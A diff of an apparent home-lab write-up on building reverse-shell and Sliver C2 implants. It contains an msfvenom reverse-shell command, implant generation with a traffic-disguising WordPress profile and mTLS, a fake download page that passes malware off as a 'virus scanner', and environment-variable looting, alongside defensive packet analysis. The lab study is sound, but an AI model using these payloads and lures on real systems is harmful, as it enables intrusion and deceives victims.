@@ -20,7 +20,7 @@ Fire up Kali and straight to man pages we go:
 $ man msfvenom
 ```
 
-I got the basic idea but didn't know which `output format` to use, so we do:
+I got the basic idea on how to use the tool but didn't know which `output format` to use, so we do:
 ```bash
 $ msfvenom --list formats
 ```
@@ -32,7 +32,7 @@ $ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f el
 # Make the payload executable:
 $ chmod +x legitBin
 ```
-Flags explained:
+**Flags explained**d
 - `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
 - `-f`: Output format: `elf`
   - `Executable & Linkable Format` is a binary format which can be executed on the system 
@@ -106,7 +106,7 @@ The listener catches the connection and the attacker effectively now has a rever
  
 
 ## Eavesdropping
-I started capturing packets on the attack machines's interface `eth1` using Wireshark. We can inspect the data being exchanged more closely by `right clicking` one of the packets, then click `Follow` and lastly choose: `TCP Stream`.
+We start a packet capture on interface `eth1` (on the attack machine) using Wireshark. We can inspect the data being exchanged more closely by `right clicking` one of the packets, then --> `Follow` and lastly --> `TCP Stream`
 
 `Red` is the attacker and `blue` is the response from the victim, talk about read team / blue team lol:
 
@@ -177,7 +177,7 @@ sliver > generate -b 192.168.130.233 -o linux
 - `-o` - Operating system
 
 Wait a few seconds for it to compile and get:
-```
+```console
 [*] Build completed in 2m44s
 [*] Implant saved to /home/steve/box/sliver/PAINFUL_WHORL
 ```
@@ -204,10 +204,44 @@ We go to the directory and send the payload away:
 ```bash
 $ rsync -av PAINFUL_WHORL vagrant@192.168.130.202:/home/vagrant
 ```
-On the victim: (play along that we did some magnificent phishing campaign again and got the victim to download the malware! 😆)
-<img width="881" height="120" alt="2026-04-30-19:44:01" src="https://github.com/user-attachments/assets/4b4df092-8eb5-4958-89ab-a1fa70b40692" />
+Play along that we did some magnificent phishing campaign again and got the victim to download the malware! 😆
 
-If we type `sessions` again in the console we can see that the connection is activated:
+## Phishing attack fantasy
+This is a very simple, unsophisticaed example on how we could achieve this:
+
+We copy the implant to the `html` subdirectory and rename it.
+```bash
+$ cp PAINFUL_WHORL html/virus_scanner
+$ ls html
+index.html  virus_scanner
+```
+The `index.html` file looks like the following:
+```html
+<!DOCTYPE html>
+<html> 
+	<head> 
+		<title>Secure Download</title>
+	</head>
+	<body> 
+		<h1>Welcome to this completely legit website for downloading your favourite system utilities!</h1>
+		<a href="./virus_scanner" download>Download an awesome virus scanner here!</a>
+	</body>
+</html
+```
+I took an example from [here](<https://www.geeksforgeeks.org/html/how-to-link-pages-in-html/>) on how to create the wep page!
+
+We can then serve the web page using python:
+```shell
+$ python3 -m http.server 8080 --directory ./html
+```
+Now we lure the victim to wisit our webpage and click the link:
+
+<img width="1920" height="502" alt="2026-05-02-12:41:45" src="https://github.com/user-attachments/assets/f4ac8c51-d63d-4864-bd52-9bd453160be3" />
+
+<img width="1778" height="321" alt="2026-05-02-13:08:24" src="https://github.com/user-attachments/assets/a5314d3c-2c9e-4239-95e9-e9ab57d99697" />
+
+
+The victim starts the "virus scanner" and we type `sessions` again in the console and see the activated connection/session:
 
 <img width="1858" height="197" alt="2026-04-30-19:44:33" src="https://github.com/user-attachments/assets/dd1d514b-2f1e-485a-9e2f-8134147f3e90" />
 
@@ -241,9 +275,9 @@ And there you have it, a simple `HTTP` connection. Next we'll dissect it.
   - What makes the connection detectable?
 
 ## Eavesdropping
-Fire up wireshark and start listening.
+Fire up wireshark and start capturing.
 
-The first suspicious thing we notice is the connection using `HTTP`, which is inherently insecure, plus it uses an old version of said protocol `HTTP/1.1`.
+The first suspicious thing we notice is the connection using `HTTP`l which is inherently insecure, plus it uses an old version of said protocol: `HTTP/1.1`.
 
 Let's take a look at an example:
 
@@ -255,17 +289,17 @@ If we `follow tcp stream` again it looks even more questionable:
 
 <img width="1373" height="685" alt="2026-04-30-20:05:58" src="https://github.com/user-attachments/assets/1fbdb81f-88e2-42eb-ae2d-b6dc321658a2" />
 
-There's a bunch of `GET` requests and the server keeps responding with `204 No Content`, which is used to implement "save and continue editing" functionality in applications.
+We notice a bunch of `GET` requests and the server responding with `204 No Content`, which is used to implement "_save and continue editing_" functionality in applications.
 
 **Q:** What makes it suspect?
 
-**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, **NOT** `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>)
+**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, NOT `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>)
 
-I found one exchange that showed some data being sent:
+I found one exchange with actual data:
 
 <img width="1376" height="505" alt="2026-04-30-20:02:20" src="https://github.com/user-attachments/assets/b070c02d-9feb-4e71-81c5-d8bb2bc9131b" />
 
-This is suspicious to me as a plain text http request would usually have some amount of human-redable strings in the data..
+This is suspicious to me as normal plain text http request would usually have some amount of human-redable strings in the data.. This seems like somebody is manually obfuscating the data being sent.
 
 
 
@@ -291,7 +325,7 @@ This is suspicious to me as a plain text http request would usually have some am
 ## Totally legit web server!
 We want the web traffic to look a bit more legit, so we generate a `c2profile` usin a wordlist of URLs.
 
-If you have `seclists` installed you can use: `/usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-x.x.x.txt`, the version i'm using is 3.3.1, depending on when you're reading this the version might differ for you!
+If you have `seclists` installed you can use: `/usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-x.x.x.txt`, the version i'm using is `3.3.1`, depending on when you're reading this the version might differ for you!
 
 Now that we have a wordlist to use, let's create a profile:
 ```console
@@ -307,7 +341,7 @@ C2 profile generated and saved as wordpress
 <img width="766" height="242" alt="2026-05-01-18:59:41" src="https://github.com/user-attachments/assets/e7561949-ae6c-40bb-8630-567b24d0c4cd" />
 
 
-We then generate a new implant based for the profile:
+We then **generate a new implant** using the **profile**:
 ```console
 sliver > generate -b 192.168.130.233 -o linux -C wordpress
 
@@ -325,7 +359,7 @@ $ mv POWERFUL_COCOA background_agent
 $ rsync -av background_agent vagrant@192.168.130.202:/home/vagrant
 ```
 
-Back in the console we issue the `jobs` command to check if we still have a listener active:
+Back in the console we issue the `jobs` command to check if the listener is still active:
 ```console
 sliver > jobs
 
@@ -333,7 +367,7 @@ sliver > jobs
 ==== ====== ========== ====== =========
  1    http   tcp        80             
 ```
-Now we just let the listener catch the incoming connection:
+**It is! Time to execute the payload on the victim.**
 
 <img width="1516" height="517" alt="2026-05-01-19:15:50" src="https://github.com/user-attachments/assets/36985793-bd21-4d7c-ba66-c31fa157b1d2" />
 
@@ -350,7 +384,7 @@ Another one:
 
 
 ### Hide
-There's something else we can do to obfuscate the connection even more: use `Wireguard` or `mTLS`. I'm going to start with [mTLS](<https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/>) A.K.A Mutual TLS.
+Let's go one step further and obfuscate the connection even more, by using `Wireguard` or `mTLS`. I'm going to start with [mTLS](<https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/>) A.K.A Mutual TLS.
 
 
 ```console
@@ -365,7 +399,7 @@ sliver > generate -m 192.168.130.233 -o linux -C wordpress
 **New flag**
 `-m`: The mtls string
 
-I renamed the payload to `mtls` in my own directory as we're starting to rack up payloads so I need a way to identify them.
+I renamed the payload to `mtls` in my own directory, as we're starting to rack up payloads and we need a way to identify them.
 
 This time we don't start an http listener, but rather one that can handle the **mTLS connection** like so:
 ```console
@@ -424,10 +458,14 @@ Well the traffic is encrypted, so it's much harder to say:
 - Show examples of some of it's features
 
 ## Multitalent
-Well, for example in the session we can easily aquire a lot of environment variables like so:
+Well, for example, in the session we can easily loot some environment variables like so:
 
 <img width="1722" height="734" alt="2026-05-01-20:05:34" src="https://github.com/user-attachments/assets/a9ee3684-1a46-4882-8448-839389264b95" />
 
+
+Or list all mounted file systems using the `mount` command:
+
+<img width="1912" height="590" alt="2026-05-02-12:24:49" src="https://github.com/user-attachments/assets/45c525f2-f8de-4f12-b480-2d8af556efc4" />
 
 
 
@@ -457,11 +495,17 @@ $ sudo apt update && sudo apt install veil -y
 
 
 # It works on my machine:
-<img width="1136" height="482" alt="2026-05-01-20:17:21" src="https://github.com/user-attachments/assets/1eb8550c-4c3c-42bd-b768-7f098b1550b3" />
 
-<img width="1126" height="248" alt="2026-05-01-20:21:15" src="https://github.com/user-attachments/assets/ce793955-d586-41be-83ca-a0a22b3b1962" />
+<img width="1701" height="870" alt="2026-05-02-11:58:30" src="https://github.com/user-attachments/assets/99e51397-df60-441c-a0e8-153e687336af" />
+
+
+<img width="700" height="33" alt="2026-05-02-11:55:24" src="https://github.com/user-attachments/assets/db50f99c-d6de-42c3-b20b-c012c8988d29" />
+
 
 <img width="1402" height="450" alt="2026-05-01-20:22:09" src="https://github.com/user-attachments/assets/6065a90c-2acd-4d01-808a-368d96b5d573" />
+
+<img width="1301" height="381" alt="2026-05-02-13:15:27" src="https://github.com/user-attachments/assets/b3bcc21d-07cb-4b13-9338-58f89101de78" />
+
 
 
 
